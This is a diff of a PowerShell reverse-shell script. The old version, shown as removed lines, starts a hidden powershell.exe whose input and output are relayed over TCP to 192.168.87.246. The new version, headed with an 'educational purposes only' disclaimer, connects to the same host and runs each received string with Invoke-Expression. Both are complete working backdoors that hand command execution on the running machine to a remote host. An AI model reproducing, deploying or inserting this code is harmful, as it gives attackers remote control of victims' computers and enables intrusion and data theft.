@@ -1,71 +1,40 @@
-# reverse_shell.ps1
+# Developed by Kuraiyume
+# WARNING: This script is intended for educational purposes only. 
+# NEVER USE THIS PAYLOAD FOR ILLEGAL ACTIVITIES. Unauthorized use 
+# of this script can result in serious legal consequences. Use 
+# responsibly and only in environments where you have explicit permission.
 
-$LHOST = "192.168.87.246"
-$LPORT = 4444
+# Define the IP address and port for the connection
+$ip = '192.168.87.246' # Replace this
+$port = 1234 # Replace this
 
-try {
-    # Create TCP client and connect
-    $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
-    $stream = $client.GetStream()
+# Create a TCP client and connect to the specified IP and port
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$stream = $client.GetStream()  # Get the network stream for reading and writing
 
-    # Create StreamReader and StreamWriter for network stream
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $writer.AutoFlush = $true
-    $reader = New-Object System.IO.StreamReader($stream)
+# Initialize a byte array to hold incoming data
+[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
 
-    # Configure PowerShell process with redirected IO
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "powershell.exe"
-    $psi.RedirectStandardInput = $true
-    $psi.RedirectStandardOutput = $true
-    $psi.RedirectStandardError = $true
-    $psi.UseShellExecute = $false
-    $psi.CreateNoWindow = $true
-
-    $process = New-Object System.Diagnostics.Process
-    $process.StartInfo = $psi
-    $process.Start() | Out-Null
-
-    $stdin = $process.StandardInput
-    $stdout = $process.StandardOutput
-    $stderr = $process.StandardError
-
-    # Main loop
-    while ($client.Connected) {
-        # Send output lines from PowerShell process to remote client
-        while (-not $stdout.EndOfStream) {
-            $line = $stdout.ReadLine()
-            $writer.WriteLine($line)
-        }
-
-        while (-not $stderr.EndOfStream) {
-            $line = $stderr.ReadLine()
-            $writer.WriteLine($line)
-        }
-
-        # Read command from remote client and send to PowerShell stdin
-        if ($stream.DataAvailable) {
-            $cmd = $reader.ReadLine()
-            if ($cmd -eq "exit") {
-                break
-            }
-            $stdin.WriteLine($cmd)
-            $stdin.Flush()
-        }
-
-        Start-Sleep -Milliseconds 100
+# Continuously read data from the stream
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    # Convert the received bytes to a string
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+    
+    # Execute the received command and capture the output
+    $sendback = try {
+        Invoke-Expression $data 2>&1 | Out-String
+    } catch {
+        $_.Exception.Message
     }
-
-    # Cleanup
-    $stdin.Close()
-    $stdout.Close()
-    $stderr.Close()
-    $process.Close()
-    $writer.Close()
-    $reader.Close()
-    $stream.Close()
-    $client.Close()
-
-} catch {
-    # Handle errors silently or log if needed
+    
+    # Append the current PowerShell prompt to the output
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+    
+    # Convert the output to bytes and send it back to the server
+    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush() # Ensure all data is sent
 }
+
+# Close the TCP connection
+$client.Close()
